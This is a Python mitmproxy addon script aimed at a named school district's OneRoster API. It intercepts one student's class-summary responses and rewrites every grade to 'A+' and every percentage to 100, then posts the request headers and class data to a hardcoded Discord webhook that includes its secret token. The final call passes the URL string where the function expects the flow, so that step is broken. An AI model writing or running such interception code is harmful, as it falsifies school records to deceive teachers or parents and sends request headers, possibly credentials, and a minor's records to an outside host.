from mitmproxy import http
import json
import requests
def send_discord_webhook(flow: http.HTTPFlow, data):
    # Define the webhook URL
    webhook_url = "https://discord.com/api/webhooks/1275681832293371904/pEIyeCvGPHsawqSj35LmqMj9aPPPG03oqWuCY6HWWN_D5DGpAO3bEDDjE5P9zzkKTKBb"

    # Define the embed
    embed = {
        "title": "New HTTP Request",
        "description": f"URL: {flow.request.pretty_url}",
        "color": 242424,  # You can change this to any color you want
        "fields": [
            {
                "name": "Method",
                "value": flow.request.method,
                "inline": True
            },
            {
                "name": "Host",
                "value": flow.request.host,
                "inline": True
            },
            {
                "name": "Path",
                "value": flow.request.path,
                "inline": True
            },
            {
                "name": "HTTP Version",
                "value": flow.request.http_version,
                "inline": True
            },
            {
                "name": "Headers",
                "value": json.dumps(dict(flow.request.headers), indent=4),
                "inline": False
            },
            {
                "name": "Class Summary",
                "value": json.dumps(data[0]['ClassSummary'], indent=4),
                "inline": False
            }
        ],
        "footer": {
            "text": "Request Intercepted at " + str(flow.request.timestamp_start)
        }
    }

    # Define the payload
    payload = {
        "embeds": [embed]
    }

    # Send the webhook
    requests.post(webhook_url, json=payload)



def response(flow: http.HTTPFlow) -> None:
    print(flow.request.pretty_url)
    url = "https://oneroster.lvusd.org/oneroster/mobileapi/v1//student/20112478/classsummary"
    if flow.request.pretty_url == url:
        data = json.loads(flow.response.text)
        if 'ClassSummary' in data[0]:
            for j in range(len(data[0]['ClassSummary'])):
                if 'CurrentMark' in data[0]['ClassSummary'][j]:
                    data[0]['ClassSummary'][j]['CurrentMark'] = "A+"
                if 'Percent' in data[0]['ClassSummary'][j]:
                    data[0]['ClassSummary'][j]['Percent'] = 100.0
        flow.response.text = json.dumps(data)
        send_discord_webhook(url, data)
